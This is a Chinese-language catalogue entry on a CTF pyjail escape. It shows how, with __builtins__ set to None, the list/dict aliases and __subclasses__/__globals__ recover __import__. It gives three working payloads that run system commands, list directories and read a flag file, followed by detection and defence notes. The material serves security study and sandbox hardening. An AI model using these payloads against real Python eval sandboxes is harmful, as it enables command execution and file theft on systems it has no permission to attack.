---
id: binary-pwn-sandbox-escape-python-builtins-none-list-dict-alias
title: MiniVN check_in：__builtins__=None 下用 list/dict 别名恢复 builtins
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: python-sandbox-builtins-recovery
aliases:
- MiniVN check_in
- __builtins__ None 绕过
- list/dict 别名 pyjail
tags:
- python
- pyjail
- sandbox-escape
- builtins
- ast
- list-subclasses
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
verification:
  verified_by: verifier-H
  verified_at: '2026-11-04T19:49:06+08:00'
  notes: 来源 93062 第 438–467 行；已对照原文核对；banned_chr（\x、+、join、引号、方括号、数字 2-9）、local_scope（__builtins__=None、lit=list、dic=dict）与 max_length=248 均一致；三条 payload 与原文逐字一致，长度约 237/242/201 字符；已把“括号”更正为“方括号”、补正子类遍历写法；未在原始比赛环境复测。
---

## 一句话结论

当沙箱把 `__builtins__` 设为 `None`、只保留 `lit=list`/`dic=dict` 别名，并禁止引号、方括号、数字 2–9 等字符时，仍可通过 `list.__class__.__subclasses__()` 找到一个函数，用它的 `__globals__` 取回真实 `__builtins__`，再调用 `__import__('os')` 执行命令或读文件。

## 原理

`__builtins__=None` 只影响传给 `eval` 的全局字典，不会删除函数对象自身 `__globals__` 中的内建模块。攻击者从 `list` 出发：

- `lit.__class__` 是 `type`，`__subclasses__()` 可以枚举 `type` 的子类；
- 取到一个带 `__globals__` 的函数/方法（示例取 `lit.__class__.__subclasses__(lit.__class__)[0].register.__globals__`）；
- 用 `lit(dic(key=1)).__getitem__(0)` 在无引号、无方括号的情况下构造字符串 `"key"`；
- 从 `__globals__` 中取回 `__builtins__`，再取 `__import__`，构造 `os` 并执行 `system`/`popen`，或用 `open` 读文件。

`lit`/`dic` 别名把列表/字典字面量变成可用构造器，绕过了引号和部分语法限制；`max_length=248` 只限制 payload 长度，不阻止这条链。

## 触发条件

- Python `eval`/`exec` 沙箱只把 `__builtins__` 置 `None`，未清理函数对象的 `__globals__`；
- 沙箱暴露 `list`/`dict` 或等价内建别名；
- 禁用字符不包含 `.`、`_`、`=`、`lit`/`dic` 等必要符号；
- payload 长度上限为 248 字符；原文三条 payload 分别约 237、242、201 字符，均未超限。

## 利用步骤

1. 确认沙箱环境：`__builtins__` 被置 `None`，`lit=list`、`dic=dict` 可用；
2. 用 `lit.__class__.__subclasses__(lit.__class__)` 枚举 `type` 的子类并取其 `register.__globals__`（示例固定第 0 个，环境不同需调整）；
3. 用 `lit(dic(key=1)).__getitem__(0)` 构造字符串，避免引号；
4. 从 `__globals__` 取 `__builtins__` → `__import__` → `os`；
5. 用 `system`/`popen` 执行命令，或用 `open` 读取目标文件。

## PoC

```python
# 命令执行（无回显版本）
lit.__class__.__subclasses__(lit.__class__).__getitem__(0).register.__globals__.get(lit(dic(__builtins__=1)).__getitem__(0)).get(lit(dic(__import__=1)).__getitem__(0))(lit(dic(os=1)).__getitem__(0)).system(lit(dic(env=1)).__getitem__(0))

# 读目录
lit.__class__.__subclasses__(lit.__class__).__getitem__(0).register.__globals__.get(lit(dic(__builtins__=1)).__getitem__(0)).get(lit(dic(__import__=1)).__getitem__(0))(lit(dic(os=1)).__getitem__(0)).popen(lit(dic(ls=1)).__getitem__(0)).read()

# 读文件
lit.__class__.__subclasses__(lit.__class__).__getitem__(0).register.__globals__.get(lit(dic(__builtins__=1)).__getitem__(0)).get(lit(dic(open=1)).__getitem__(0))(lit(dic(flag=1)).__getitem__(0)).read()
```

## 变体与关联

- 变体：用其它带 `__globals__` 的函数/类恢复 builtins；
- 关联：子类遍历、审计钩子绕过、Unicode/海象绕过等 Pyjail 场景。

## 检测与防御

- 检测：payload 中出现 `__subclasses__`、`__globals__`、`__builtins__`、`lit(`/`dic(` 组合；
- 防御：不要只把 `__builtins__` 置 `None`；使用进程级隔离/白名单 AST；限制 `__subclasses__`/`__globals__` 访问；对 payload 做长度外的语义检查。
